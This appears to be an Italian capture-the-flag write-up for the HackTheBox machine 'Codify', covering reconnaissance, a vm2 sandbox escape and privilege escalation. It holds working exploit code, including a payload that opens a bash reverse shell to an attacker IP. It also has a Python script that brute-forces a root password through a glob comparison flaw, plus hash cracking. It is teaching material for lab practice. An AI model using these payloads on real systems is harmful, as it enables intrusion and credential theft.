# Codify

## Reconnaissance

Per prima cosa eseguo una scansione iniziale con nmap.

```text
sudo nmap -sC -sV -O -oA /usr/share/nmap/initial 10.10.11.239
```

* **-sC**: scipt nmap di default
* **-sV**: per rilevare la versione dei servizi
* **-O**: per rilevare il SO
* **-oA**: per stampare tutti i formati e salvarli nel file _nmap/initial_

Il risultato della scansione è il seguente:

```text
Nmap scan report for 10.10.11.239
Host is up (0.043s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
80/tcp   open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://codify.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
3000/tcp open  http    Node.js Express framework
|_http-title: Codify
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=11/9%OT=22%CT=1%CU=36246%PV=Y%DS=2%DC=I%G=Y%TM=654CD79
OS:3%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1
OS:1NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: Host: codify.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Aggiungo _codify.htb_ al file _/etc/hosts_ e passo alla fase successiva.

## Enumeration

Successivamente, visito la pagina http://10.10.11.239/:

<p align="center">
  <img src="/Immagini/Linux-Box/Codify/codify-1.png" />
</p>

Provo ad utilizzare il comando _gobuster_:

```text
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://codify.htb/
```

Ottengo il seguente risultato:

```text
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://codify.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/about                (Status: 200) [Size: 2921]
/About                (Status: 200) [Size: 2921]
/editor               (Status: 200) [Size: 3123]
/Editor               (Status: 200) [Size: 3123]
/ABOUT                (Status: 200) [Size: 2921]
/limitations          (Status: 200) [Size: 2665]
/server-status        (Status: 403) [Size: 275]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```

Navigando tra le varie pagine ottengo tutte le informazioni necessarie per passare alla fase successiva.

In particolare:
  - In http://codify.htb/about si fa riferimento alla libreria vm2 e in particolare alla versione 3.9.16.
  - In http://codify.htb/editor c'è un tool che permette di testare codice node.js.
  - In http://codify.htb/limitations c'è una lista delle librerie node.js che possono essere importate sul tool di testing.

## Exploitation

Tra tutte le informazioni ottenute quella relativa alla libreria vm2 risulta la più interessante, in quanto, dopo varie ricerche, mi imbatto in questa vulnerabilità: https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244.

Quindi, modifico il codice in questa maniera:

```text
const {VM} = require("vm2");
const vm = new VM();

const code = `
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};

const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync("bash -c 'bash -i >& /dev/tcp/10.10.14.7/9999 0>&1'");
}
`

console.log(vm.run(code));
```

Avvio un listener sulla porta 9999 ed eseguo il codice sull'editor.

<p align="center">
  <img src="/Immagini/Linux-Box/Codify/codify-3.png" />
</p>

**Sono dentro!**

## Privilege Escalation

Purtroppo l'utente _svc_ non possiede alcun flag, quindi cerco di trovare una strada per elevare i miei privilegi.

Dopo aver navigato tra le varie directory, trovo il file _tickets.db_ che contiene al suo interno le credenziali per l'utente _joshua_:

<p align="center">
  <img src="/Immagini/Linux-Box/Codify/codify-2.png" />
</p>

Quindi copio questo hash, lo inserisco all'interno di un file e avvio _john_:

```text
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

**Riesco a recuperare la password!**

<p align="center">
  <img src="/Immagini/Linux-Box/Codify/codify-4.png" />
</p>

Mi collego quindi tramite ssh e ottengo il primo flag.

Ora devo trovare un modo per divetnare root. Come prima cosa controllo i privilegi sudo dell'utente _joshua_:

<p align="center">
  <img src="/Immagini/Linux-Box/Codify/codify-5.png" />
</p>

Il contenuto del file _mysql-backup.sh_ è il seguente:

```text
#!/bin/bash
DB_USER="root"
DB_PASS=$(/usr/bin/cat /root/.creds)
BACKUP_DIR="/var/backups/mysql"

read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
/usr/bin/echo

if [[ $DB_PASS == $USER_PASS ]]; then
        /usr/bin/echo "Password confirmed!"
else
        /usr/bin/echo "Password confirmation failed!"
        exit 1
fi

/usr/bin/mkdir -p "$BACKUP_DIR"

databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")

for db in $databases; do
    /usr/bin/echo "Backing up database: $db"
    /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"
done

/usr/bin/echo "All databases backed up successfully!"
/usr/bin/echo "Changing the permissions"
/usr/bin/chown root:sys-adm "$BACKUP_DIR"
/usr/bin/chmod 774 -R "$BACKUP_DIR"
/usr/bin/echo 'Done!'
```

Questo script, una volta eseguito, richiede l'inserimento della password dell'utente root e nel caso dovesse essere quella corretta stampa in output: "Password confirmed!".

Effettuando diversi tentativi, scopro che inserendo il carattere "*" ottengo in output "Password confirmed!". Quindi cerco di sfruttare questo comportamento attraverso l'utilizzo di questo codice in python:

```text
import string
import subprocess

wordlist = string.ascii_letters + string.digits
c = ""

while True:
  for i in wordlist:
    s = c + i + "*"

    p = subprocess.Popen(
      ["sudo", "/opt/scripts/mysql-backup.sh"],
      stdin=subprocess.PIPE,
      stdout=subprocess.PIPE,
      stderr=subprocess.PIPE,
      text=True
      )

    stdout, stderr = p.communicate(input=s)

    if "Done!" in stdout:
      c += i
      print(c)
```

Lo eseguo e ottengo il seguente output:

```text
k
kl
klj
kljh
kljh1
kljh12
kljh12k
kljh12k3
kljh12k3j
kljh12k3jh
kljh12k3jha
kljh12k3jhas
kljh12k3jhask
kljh12k3jhaskj
kljh12k3jhaskjh
kljh12k3jhaskjh1
kljh12k3jhaskjh12
kljh12k3jhaskjh12k
kljh12k3jhaskjh12kj
kljh12k3jhaskjh12kjh
kljh12k3jhaskjh12kjh3
```

Provo la password:

<p align="center">
  <img src="/Immagini/Linux-Box/Codify/codify-6.png" />
</p>

**Sono root!**
